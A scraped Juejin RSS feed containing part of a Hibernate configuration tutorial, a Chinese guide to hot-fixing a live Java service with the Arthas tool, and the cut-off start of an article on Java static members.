<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 使用Configuration类加载hibernate.cfg.xml配置文件</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<p>在上面的代码中，<code>new Configuration().configure("hibernate.cfg.xml")</code>会自动查找类路径下的<code>hibernate.cfg.xml</code>文件，并加载其中的配置信息。然后使用这些配置信息构建<code>SessionFactory</code>实例。</p>
<h4 data-id="heading-4">2. 使用<code>hibernate.properties</code>加载配置</h4>
<p>除了<code>hibernate.cfg.xml</code>，Hibernate还支持通过<code>hibernate.properties</code>文件加载配置信息。</p>
<h5 data-id="heading-5">示例配置文件 <code>hibernate.properties</code></h5>
<pre><code class="hljs language-properties" lang="properties">hibernate.connection.driver_class=com.mysql.cj.jdbc.Driver
hibernate.connection.url=jdbc:mysql://localhost:3306/your_database
hibernate.connection.username=your_username
hibernate.connection.password=your_password
hibernate.dialect=org.hibernate.dialect.MySQLDialect
hibernate.show_sql=true
hibernate.format_sql=true
hibernate.hbm2ddl.auto=update
</code></pre>
<h5 data-id="heading-6">加载<code>hibernate.properties</code>的示例代码</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 使用Configuration类加载hibernate.properties配置文件</span>
            <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>();
            configuration.configure(); <span class="hljs-comment">// 默认会加载类路径下的hibernate.cfg.xml或hibernate.properties</span>
            sessionFactory = configuration.buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<p>在上面的代码中，<code>configuration.configure()</code>默认会加载类路径下的<code>hibernate.cfg.xml</code>或<code>hibernate.properties</code>文件，可以根据具体需求调整。</p>
<h3 data-id="heading-7">配置文件加载的深入解释</h3>
<ol>
<li>
<p><strong>Configuration类</strong>：</p>
<ul>
<li><code>org.hibernate.cfg.Configuration</code>类是Hibernate用来配置的核心类。它可以从XML文件或Java属性文件加载配置。</li>
<li><code>configure()</code>方法默认查找类路径根目录下的<code>hibernate.cfg.xml</code>文件。如果提供文件名参数，<code>configure("hibernate.properties")</code>则会加载指定文件。</li>
</ul>
</li>
<li>
<p><strong>SessionFactory</strong>：</p>
<ul>
<li><code>SessionFactory</code>是Hibernate框架中的关键对象，负责创建<code>Session</code>对象。<code>Session</code>对象是单线程的短期对象，用于执行CRUD操作。</li>
<li><code>SessionFactory</code>是线程安全的，可以在应用程序中全局共享，通常在应用启动时创建一次，并在整个应用生命周期中使用。</li>
</ul>
</li>
<li>
<p><strong>异常处理</strong>：</p>
<ul>
<li>在静态块中初始化<code>SessionFactory</code>，并捕获任何可能的异常。如果初始化失败，会抛出<code>ExceptionInInitializerError</code>，确保应用及时发现配置问题。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">综合示例</h3>
<p>以下是一个完整的示例，展示如何配置并加载Hibernate配置文件，创建<code>SessionFactory</code>并执行一些基本操作。</p>
<h5 data-id="heading-9">完整示例</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-comment">// HibernateUtil类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}

<span class="hljs-comment">// Category类</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "category")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Category</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@OneToMany(mappedBy = "category", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Product&gt; products = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-comment">// Getters 和 Setters</span>
}

<span class="hljs-comment">// Product类</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "category_id")</span>
    <span class="hljs-keyword">private</span> Category category;

    <span class="hljs-comment">// Getters 和 Setters</span>
}

<span class="hljs-comment">// Hibernate测试类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入示例数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Category</span>();
            category.setName(<span class="hljs-string">"Electronics"</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product1.setName(<span class="hljs-string">"Laptop"</span>);
            product1.setPrice(<span class="hljs-number">1000.0</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product2.setName(<span class="hljs-string">"Smartphone"</span>);
            product2.setPrice(<span class="hljs-number">500.0</span>);

            category.addProduct(product1);
            category.addProduct(product2);

            session.save(category);

            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<p>在这个综合示例中，<code>HibernateUtil</code>类负责加载配置文件并创建<code>SessionFactory</code>，<code>Category</code>和<code>Product</code>类定义了实体，<code>HibernateTest</code>类则演示了如何使用Hibernate进行数据操作。通过这种方式，可以有效地加载和使用Hibernate的配置文件进行数据库操作。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Arthas 实战：线上 BUG 不重启？热更新救场指南]]></title>    <link>https://juejin.cn/post/7595837635569287220</link>    <guid>https://juejin.cn/post/7595837635569287220</guid>    <pubDate>2026-01-16T09:13:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595837635569287220" data-draft-id="7595755710733221903" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Arthas 实战：线上 BUG 不重启？热更新救场指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-16T09:13:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Arthas 实战：线上 BUG 不重启？热更新救场指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:13:27.000Z" title="Fri Jan 16 2026 09:13:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、线上应急的“生死时速”</h2>
<p>小张的团队刚完成代码上线，用户却反馈核心功能出现小 bug——订单状态同步异常，直接影响了客户体验。更棘手的是：<strong>重新打包、测试、发布全流程需要 1 小时以上</strong>，但用户迫切需要正常使用系统，“停机发版”意味着资损风险和口碑下滑。</p>
<p>此时， <strong>“不停机修复线上问题”</strong> ​ 成为唯一选择。而阿里开源的 Java 诊断利器 <strong>Arthas</strong>，正是解决这类场景的“救命稻草”。</p>
<h2 data-id="heading-1">二、Arthas 热更新的破局逻辑</h2>
<p>传统发版流程（编译→打包→部署→灰度）的本质是<strong>重启 JVM 加载新类</strong>，但线上业务对“停机零容忍”，必须寻找 <strong>“无侵入式热更新”</strong> ​ 方案。</p>
<p>Arthas 基于 <strong>Java Agent + 字节码增强</strong>​ 技术，通过 <code>Instrumentation</code>API 实现<strong>运行时替换类字节码</strong>，无需重启 JVM 即可让新逻辑生效。其核心是 <strong><code>retransformClasses</code>方法</strong>（允许类加载后重新转换字节码），配合反编译、编译命令，完成“诊断→修改→热加载”闭环。</p>
<h2 data-id="heading-2">三、四步实操：从反编译到热部署</h2>
<h3 data-id="heading-3">步骤 1：部署 &amp; 启动 Arthas</h3>
<p>登录<strong>存在 BUG 的服务器</strong>，通过以下命令快速部署 Arthas：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载 Arthas 引导包（国内镜像加速）</span>
curl -O https://arthas.aliyun.com/arthas-boot.jar  

<span class="hljs-comment"># 启动 Arthas 并选择目标 Java 进程  </span>
java -jar arthas-boot.jar
</code></pre>
<p>执行 <code>arthas-boot.jar</code>后，终端会列出当前服务器所有 Java 进程（含端口、启动参数）。根据业务标识（如端口、Spring Boot 应用名）选择<strong>目标进程编号</strong>，回车进入 Arthas 交互终端。</p>
<h3 data-id="heading-4">步骤 2：反编译目标类（提取源码）</h3>
<p>假设业务 BUG 出现在 <code>com.example.demo.service.OrderService</code>类的方法中，需先反编译获取源码：</p>
<pre><code class="hljs language-javascript" lang="javascript">jad --source-only com.<span class="hljs-property">example</span>.<span class="hljs-property">demo</span>.<span class="hljs-property">service</span>.<span class="hljs-property">OrderService</span> &gt; <span class="hljs-regexp">/tmp/</span><span class="hljs-title class_">OrderService</span>.<span class="hljs-property">java</span>
</code></pre>
<ul>
<li><code>jad</code>：Arthas 反编译命令，<code>--source-only</code>表示<strong>仅输出 Java 源码</strong>（省略字节码细节）。</li>
<li>输出路径 <code>/tmp/OrderService.java</code>需确保有写权限，后续用编辑器修改。</li>
</ul>
<blockquote>
<p>执行后会看到 Arthas 输出类加载器信息（如 <code>ClassLoader: 123456789</code>），这是后续编译的关键参数！</p>
</blockquote>
<h3 data-id="heading-5">步骤 3：修改源码 &amp; 编译（生成新 Class）</h3>
<p>用 <code>vim</code>或 IDE 打开 <code>/tmp/OrderService.java</code>，修复 BUG（如修正订单状态判断逻辑）。修改后，通过 <code>mc</code>命令编译源码：</p>
<pre><code class="hljs language-bash" lang="bash">mc -c 123456789 /tmp/OrderService.java -d /tmp/classes
</code></pre>
<ul>
<li><code>mc</code>：Arthas 编译命令，基于 JDK <code>JavaCompiler</code>API 实现<strong>内存编译</strong>。</li>
<li><code>-c 123456789</code>：指定<strong>类加载器的 hashcode</strong>（步骤 2 中 <code>jad</code>输出的 <code>ClassLoader</code>值），确保编译后的类能被目标类加载器识别。</li>
<li><code>-d /tmp/classes</code>：指定输出 <code>.class</code>文件的目录（需提前创建）。</li>
</ul>
<h3 data-id="heading-6">步骤 4：热加载新 Class（生效新逻辑）</h3>
<p>编译生成新 <code>.class</code>文件后，通过 <code>retransform</code>命令加载新字节码：</p>
<pre><code class="hljs language-arduino" lang="arduino">retransform /tmp/classes/com/example/demo/service/OrderService.<span class="hljs-keyword">class</span>
</code></pre>
<ul>
<li><code>retransform</code>：触发 JVM <code>retransformClasses</code>方法，<strong>替换已加载类的字节码</strong>。后续业务请求将自动使用新逻辑。</li>
</ul>
<h2 data-id="heading-7">四、原理深挖：Arthas 如何“无侵入”热更新？</h2>
<p>Java 的 <code>Instrumentation</code>API 是热更新的技术基石，但原生 API 存在限制：</p>
<ul>
<li><code>redefineClasses</code>：可替换类字节码，但<strong>要求新旧类结构完全一致</strong>（不能增删字段/方法）。</li>
<li><code>retransformClasses</code>：允许类加载后重新转换字节码，<strong>对结构修改兼容性更强</strong>（Arthas 热更新的核心）。</li>
</ul>
<p>Arthas 通过 <strong>Attach 机制</strong>​ 注入 Java Agent 到目标 JVM，利用 <code>retransformClasses</code>实现类字节码替换，全程无需重启进程，真正做到“业务零感知”。</p>
<h2 data-id="heading-8">五、避坑指南：热更新的边界与最佳实践</h2>
<p>热更新是<strong>应急手段</strong>，需警惕以下风险：</p>
<ol>
<li>
<p><strong>类加载器隔离</strong>​</p>
<p>若应用是多模块（如 Tomcat 多 Webapp），不同模块由独立类加载器加载。需确保 <code>mc</code>命令的 <code>-c</code>参数与 <code>jad</code>输出的类加载器 hashcode 一致，否则新 Class 无法被正确加载。</p>
</li>
<li>
<p><strong>修改范围限制</strong>​</p>
<p>热更新<strong>仅支持修改方法体内逻辑</strong>，禁止增删字段、方法，或修改类继承关系（否则触发 JVM 结构冲突，<code>retransform</code>失败）。</p>
</li>
<li>
<p><strong>备份与回滚</strong>​</p>
<p>热更新前用 <code>jad</code>保存原 <code>.java</code>文件，出现问题时可通过 <code>retransform</code>加载原 Class 回滚。</p>
</li>
<li>
<p><strong>生产环境克制使用</strong>​</p>
<p>热更新是“救火工具”，事后需补发正式版本。长期依赖热更新会导致代码版本混乱，增加维护成本。</p>
</li>
</ol>
<h2 data-id="heading-9">六、总结：Arthas 不止于热更新</h2>
<p>Arthas 是<strong>Java 在线诊断的全能选手</strong>：不仅能热更新救火，还能通过 <code>trace</code>（链路追踪）、<code>watch</code>（方法观测）、<code>stack</code>（线程栈分析）排查性能瓶颈、死锁等问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java static 静态变量 / 静态方法 超详细讲解（底层原理 + 内存分配 + 使用场景)]]></title>    <link>https://juejin.cn/post/7595683968683753518</link>    <guid>https://juejin.cn/post/7595683968683753518</guid>    <pubDate>2026-01-16T09:02:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595683968683753518" data-draft-id="7595683968683720750" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java static 静态变量 / 静态方法 超详细讲解（底层原理 + 内存分配 + 使用场景)"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-16T09:02:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="定仙游453"/> <meta itemprop="url" content="https://juejin.cn/user/3968578224130505"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java static 静态变量 / 静态方法 超详细讲解（底层原理 + 内存分配 + 使用场景)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3968578224130505/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    定仙游453
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:02:11.000Z" title="Fri Jan 16 2026 09:02:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol 